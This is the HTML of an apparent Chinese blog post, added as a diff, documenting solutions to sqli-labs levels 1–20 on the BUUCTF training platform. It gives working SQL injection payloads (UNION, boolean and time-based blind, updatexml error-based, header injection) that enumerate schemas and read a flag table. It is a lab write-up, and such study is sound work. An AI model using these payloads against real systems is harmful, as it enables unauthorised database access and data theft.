@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="因为做的是buuctf给的环境，所以这里的目标是拿到flag。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF sqli-labs 刷题记录（1-20）">
+<meta property="og:url" content="https://dopaminer.github.io/2020/02/24/sqli-labs 刷题记录/index.html">
+<meta property="og:site_name" content="Dopamine&#39;s Blog">
+<meta property="og:description" content="因为做的是buuctf给的环境，所以这里的目标是拿到flag。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203105314.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120146.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120249.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203140634.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203151304.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203153058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200216173900.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217164653.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217190659.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217192610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217193712.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217200014.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218105741.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218135018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218135552.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218152223.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218153827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200220142648.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223110545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223121432.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223122159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223154102.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223154255.png">
+<meta property="og:image" content="http://q65bxiop3.bkt.clouddn.com/img/20200223163306.png">
+<meta property="og:image" content="http://q65bxiop3.bkt.clouddn.com/img/20200224084440.png">
+<meta property="og:image" content="http://q65bxiop3.bkt.clouddn.com/img/20200224101834.png">
+<meta property="og:updated_time" content="2020-02-24T02:33:24.423Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUCTF sqli-labs 刷题记录（1-20）">
+<meta name="twitter:description" content="因为做的是buuctf给的环境，所以这里的目标是拿到flag。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203105314.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://dopaminer.github.io/2020/02/24/sqli-labs 刷题记录/">
+
+
+
+
+
+  <title>BUUCTF sqli-labs 刷题记录（1-20） | Dopamine's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dopamine's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2020/02/24/sqli-labs 刷题记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D0pamine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/头像.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dopamine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF sqli-labs 刷题记录（1-20）</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-24T10:32:40+08:00">
+                2020-02-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>因为做的是buuctf给的环境，所以这里的目标是拿到flag。</p>
+<a id="more"></a>
+
+<h4 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h4><h5 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h5><p>平平无奇的GET方式字符型联合注入。</p>
+<p>单引号报错加上’ or 1=1 –+回显正常确定是字符型，因为有回显所以开始order by猜列数，猜出来是3，直接一套union注入拿下。附上payload。</p>
+<p>查库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and 0 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203105314.png" alt></p>
+<p>在security库里查表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and 0 union <span class="keyword">select</span> <span class="number">1</span>, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">"ctftraining"</span>),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120146.png" alt></p>
+<p>flag表里查字段名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and 0 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),3 --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120249.png" alt></p>
+<p>最后就是在flag字段里查内容，但是要注意这个字段不在当前库里，得给他加一个库的前缀</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and 0 union <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> ctftraining.flag <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203120448.png" alt></p>
+<h5 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h5><p>输入单引号和反斜杠测试，通过报错信息确定是数字型，后面的union注入和lesson-1一模一样了，不再赘述。</p>
+<p><strong>这里说一下如何通过报错信息确认是字符型还是数字型，也就是你输入的参数是被单引号/双引号包裹，还是裸奔。</strong>回到lesson-1，当我输入id=1’的时候，报错信息如下</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203140634.png" alt></p>
+<p>重点看<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，将这里的单引号匹配：<code>&#39;     &#39;  1&#39; &#39; LIMIT 0,1     &#39;</code></p>
+<p><code>1&#39;</code>是我们输入的内容，可以发现输入的内容是被一对单引号包裹的，所以在输入了一个单引号后，mysql就会把前面的和输入的单引号匹配，导致后面多出来一个单引号，所以报错。所以可以猜想，他的SQL语句应该是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'参数'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>字符型的特点就是，我们输入的任何参数，代码，查询语句，都被当成字符串处理，无法执行，所以如果想执行输入的语句，就需要闭合字符串，也就是自己输入一个单引号，在输入的单引号后面插入查询语句，然后再把原有的单引号注释掉，就不会报错了。</p>
+<p>再来看数字型的报错，输入<code>1&#39;</code>时：</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203151304.png" alt></p>
+<p>猜想的查询语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span><span class="string">' LIMIT 0,1;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务器的逻辑来看，前面的<code>id=1</code>是没有问题的，有问题的是后面的内容，所以报错的时候只报错后面的内容，就和字符型的可以区分了。</p>
+<p>平常我们判断的时候，对于有回显的注入，可以用<code>1 and 1=1</code>和<code>1 and 1=2</code>先测试，如果两者的回显有区别，基本可以判断是int型，如果没有区别，再试试用<code>&#39;</code>看有没有报错信息，以及<code>1&#39; and 1=1 --+</code>还有<code>1&#39; and 1=2 --+</code>看看回显有没有区别来判定。</p>
+<h5 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h5><p>常规测试，输入了<code>1&#39;</code>，报错信息：</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200203153058.png" alt></p>
+<p>分析出SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> (<span class="keyword">id</span>=<span class="string">'参数'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们闭合的话就得输入<code>1&#39;) and 1=2 --+</code>，后面的步骤也是常规union注入。</p>
+<h5 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h5><p>这题刚开始用了各种测试回显都没有变化，后来发现居然是双引号闭合的…确实不太常见，不过这也说明还是要多试试。看报错信息可以发现是双引号+括号闭合的，所以步骤就和前面一样了，不赘述。</p>
+<h5 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h5><p>简单的测试过后，发现这题的回显只有是与否了，如果你输入的是正确的，界面就会返回you are in，如果是错误的输入，就无回显。这是典型的布尔注入，确实也可以利用布尔注入，但作者给的这题的描述是double injection，双查询注入，所以不妨来了解一下新做法。关于双查询注入，我单独写了一篇<a href>文章</a>，题解也在那篇文章中给出了，去看就好。</p>
+<h5 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h5><p>同5是double injection，只不过这里是双引号闭合。</p>
+<h5 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h5><p>这道题，测试语句是<code>id=1 and 1=1</code>和<code>id=1 and 1=2</code>，回显相同，测试<code>id=1&#39; and 1=1 --+</code>以及 <code>id=1&#39; and 1=2 --+</code>又都报错，不理解之下去看了源码，居然是这样闭合的…</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200216173900.png" alt></p>
+<p>(遇到一个暂时无法解决的问题，所以这关先放着，当然直接盲注也是可以过的)</p>
+<h5 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h5><p>简单测试后发现是单引号闭合的字符型注入。并且这一关的回显只给了true和false之分，如果你输入的语句判断为true，就显示“You are in…”，否则无任何显示。没有具体的信息可以查询出来，也没有了报错信息（看源码可以发现是被注释掉了），看来这题只能用盲注了，好在还有true or false的回显，所以选用布尔注入。</p>
+<p>直接上（垃圾）脚本吧。</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217164653.png" alt></p>
+<p>这个脚本够用了，换payload就行了。</p>
+<p>爆库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1'and(mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),%s,<span class="number">1</span>)=<span class="string">'%s'</span>)<span class="string">'''%(order,num)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217190659.png" alt></p>
+<p>爆表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1'and(mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ctftraining'</span>),%s,<span class="number">1</span>)=<span class="string">'%s'</span>)<span class="string">'''%(order,num)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217192610.png" alt></p>
+<p>爆列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1'and(mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),%s,<span class="number">1</span>)=<span class="string">'%s'</span>)<span class="string">'''%(order,num)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217193712.png" alt></p>
+<p>爆内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&apos;&apos;&apos;?id=1&apos;and(mid((select flag from ctftraining.flag),%s,1)=&apos;%s&apos;)&apos;&apos;&apos;%(order,num)+&apos;%23&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200217200014.png" alt></p>
+<p>(话说最后flag都爆了快500s…感觉脚本还是有点慢)</p>
+<h5 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h5><p>通过简单测试，发现只要你id有输入，无论输入什么值都给回显“You are in…”，无法触发报错，也没有输入true or false的分别，这就是典型的时间盲注。</p>
+<p>总要测试id是如何闭合的，时间盲注的测试只能用类似<code>sleep()</code>这种函数，比如输入正确则<code>sleep(5)</code>，输入错误则<code>sleep(0)</code>，用页面的响应时间来区分true or false。</p>
+<p>输入<code>id=1 and sleep(5)</code>——立即响应。</p>
+<p>输入<code>id=1&#39; and sleep(5) --+</code>停滞一段时间后响应，打开控制台查看，发现响应停滞了5s，证明成功闭合，所以查询语句为<code>select xxx from tables where id=&#39;$_GET[&#39;id&#39;]&#39;;</code>，即单引号闭合的字符型注入。</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218105741.png" alt></p>
+<p>下面就是直接上脚本了。</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218135018.png" alt></p>
+<p>其实网速稳定一点，<code>sleep(5)</code>就可以了，我这里网络环境太不稳定，爆出来各种错误，也是很无奈，只能是爆多几遍，合成一下了。基本上<code>print(time.time()-startTime)</code>如果和你限定的<code>sleep()</code>参数相差不大的话，一般来说爆出来的就是正确的，如果由于网络阻塞延迟，那可能差距就特别大了，我print出来最多的100+秒的都有…</p>
+<p>如图举例</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218135552.png" alt></p>
+<p>这里这个ctb的b就错了，应该是f，但是顺位到b的时候延迟了一下，所以就把b给爆出来然后爆下一个去了…</p>
+<p>不过当然也有办法可以适当规避这种错误，比如限制返回时长在30~40之间，就能规避掉一些网络延时问题，但也不能保证完全正确，所以还是网络环境稳定最好了…</p>
+<p>payload：</p>
+<p>爆库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1' and if((mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span> information_schema.schemata),%s,<span class="number">1</span>)=<span class="string">'%s'</span>),<span class="keyword">sleep</span>(<span class="number">30</span>),<span class="keyword">sleep</span>(<span class="number">0</span>))<span class="string">'''%(order,i)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>爆表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1' and if((mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'ctftraining'</span>),%s,<span class="number">1</span>)=<span class="string">'%s'</span>),<span class="keyword">sleep</span>(<span class="number">30</span>),<span class="keyword">sleep</span>(<span class="number">0</span>))<span class="string">'''%(order,i)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>爆列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1' and if((mid((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),%s,<span class="number">1</span>)=<span class="string">'%s'</span>),<span class="keyword">sleep</span>(<span class="number">30</span>),<span class="keyword">sleep</span>(<span class="number">0</span>))<span class="string">'''%(order,i)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>爆内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload='''?id=1' and if((mid((<span class="keyword">select</span> flag <span class="keyword">from</span> ctftraining.flag),%s,<span class="number">1</span>)=<span class="string">'%s'</span>),<span class="keyword">sleep</span>(<span class="number">30</span>),<span class="keyword">sleep</span>(<span class="number">0</span>))<span class="string">'''%(order,i)+'</span>%<span class="number">23</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注的成本还是挺高的，一是网络环境不稳容易出错，二是会花费很长的爆破时间。</p>
+<h5 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h5><p>简单测试发现是双引号闭合的字符型时间盲注，和上一关的区别仅仅在于这一关是双引号闭合，不再赘述。</p>
+<h5 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h5><p>从这一关开始变成了POST型注入，给了一个登陆框，可以输入username和password。经过简单测试，发现username和password都是注入点，并且是单引号闭合的字符型注入。</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218152223.png" alt></p>
+<p>而且可以查询到确切的内容，果断使用联合注入。</p>
+<p>和第一关唯一不同的地方就是，这里变成了两列，其他都一样了，payload照抄即可。</p>
+<h5 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h5><p>和上一关的区别就是闭合方式变了，先分别输入单引号和双引号测试，发现双引号的时候报错了</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200218153827.png" alt></p>
+<p>从报错信息可以看出来闭合方式是双引号+括号，然后就传统艺能联合注入就好了。</p>
+<h5 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h5><p>这一题简单测试后，发现是单引号+括号闭合，并且已经无法查询到确切内容，但是报错内容还是有显示的，所以我们可以选用报错注入。题目描述是double injection，所以就跟第五关一样了，没什么好说的，第五关的时候已经详细讲过了，payload也不变。</p>
+<h5 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h5><p>和上一关的区别仅仅在于这是双引号闭合的。</p>
+<h5 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h5><p>这一关开始，报错信息也没了，又到了盲注的时刻，而且现在true和false的回显区别在于返回两张不同的图片，图片上告知你是true or false，不过这个也跟返回”You are in”是一个原理，我选择用布尔注入。直接看脚本就很明晰了。</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200220142648.png" alt></p>
+<p>不过有一个问题我实在不明白，脚本应该是没大毛病的，但是为什么有时候会爆不出来正确的？得亏这题是不区分大小写，前面的小写部分明明有正确的却被跳过了，到后面大写的时候才重新被验证为true，比如这里flag就被爆成了flAg…只能合理怀疑是网络延时导致的。</p>
+<p>payload和前面Less-8的布尔注入也一样，不重复了。</p>
+<h5 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h5><p>就是把上一关的单引号闭合改成双引号+括号闭合就好啦。</p>
+<h5 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h5><p>这一题的界面和前面不同了，还是把uname当成注入点，测试了半天都不知道是怎么闭合的，只有在输入admin的时候误打误撞正确了，还说password reset…</p>
+<p>有点费解的去看了源码，发现这题变化大了</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223110545.png" alt></p>
+<p>根据源码我们可以知道，对uname参数用check_input()函数进行了检查，看来是不能在这里注入了，只能把passwd当成注入点。并且在后面单独对uname进行了查询，查询你输入的uname是否在库中，如果不是的话，则无论如何都返回骂人的图片。所以这里就要猜库里的uname了，猜到一个admin，很常规。</p>
+<p>然后在passwd输入<code>&#39;</code>，出现了报错信息</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223121432.png" alt></p>
+<p>思路明确，报错注入，单引号闭合。</p>
+<p>用了基于xpath语法错误的报错注入，有一个缺陷就是他显示的长度有限，最多32位，不过没关系，可以用substr()函数截取。</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1' or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> ctftraining.flag),<span class="number">1</span>,<span class="number">32</span>)),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223122159.png" alt></p>
+<p>得到了前半段flag，后半段只要改substr(string,startnumber,length)后两个参数就好了。</p>
+<p>顺便一提，这篇<a href="https://www.jianshu.com/p/43385821c6b5" target="_blank" rel="noopener">文章</a>关于less-17解读的非常详细。</p>
+<h5 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h5><p>随手输入admin和上一关改过的新密码，发现有返回user-agent</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223154102.png" alt></p>
+<p>但还是一头雾水，所以去看了源码，发现这次对uname和passwd都用了check_input()，看来这两个地方都不能注入了，但是没关系，我们发现了insert语句</p>
+<p><img src="https://raw.githubusercontent.com/Dopaminer/Figurebed/master/img/20200223154255.png" alt></p>
+<p>这里把user-agent和ip以及uname的内容都插入数据库中，而且并没有过滤，因此这是一个很好的注入点，但是考虑到uname有过滤，ip也不容易修改，所以将注入点定为user-agent。</p>
+<p>bp抓包，改user-agent，因为有回显，先尝试了一下union注入，发现好像并不行，而且有给出报错内容，所以选用报错注入。</p>
+<p><img src="http://q65bxiop3.bkt.clouddn.com/img/20200223163306.png" alt></p>
+<h5 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h5><p>和上一关差不多，输入了正确的uname&amp;passwd，显示出了Referer，看来这次的注入点就是在Referer了。</p>
+<p><img src="http://q65bxiop3.bkt.clouddn.com/img/20200224084440.png" alt></p>
+<h5 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h5><p>根据提示，这题是在cookie位置注入，但是这题好像没有cookie，直接在bp给他添加就好了。</p>
+<p><img src="http://q65bxiop3.bkt.clouddn.com/img/20200224101834.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/22/SQL注入之报错注入/" rel="next" title="SQL注入之报错注入">
+                <i class="fa fa-chevron-left"></i> SQL注入之报错注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
